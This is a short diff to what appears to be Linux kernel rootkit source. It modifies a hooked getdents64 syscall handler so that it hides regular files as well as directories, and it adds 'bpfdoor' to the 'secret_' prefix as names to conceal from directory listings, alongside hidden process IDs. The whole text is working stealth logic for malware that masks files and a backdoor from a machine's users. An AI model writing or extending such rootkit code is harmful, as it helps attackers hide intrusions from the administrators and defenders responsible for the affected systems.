@@ -646,8 +646,11 @@ static asmlinkage int hook_getdents64(const struct pt_regs *regs)
         if (is_pid_hidden(cur->d_name))
             hide = true;
 
-        if (!hide && (cur->d_type == DT_DIR || cur->d_type == DT_UNKNOWN)) {
-            if (strncmp(cur->d_name, "secret_", 7) == 0)
+        if (!hide && (cur->d_type == DT_DIR || cur->d_type == DT_REG || cur->d_type == DT_UNKNOWN)) {
+
+        if (strncmp(cur->d_name, "secret_", 7) == 0 ||
+            strncmp(cur->d_name, "bpfdoor", 7) == 0)
+
                 hide = true;
         }
 
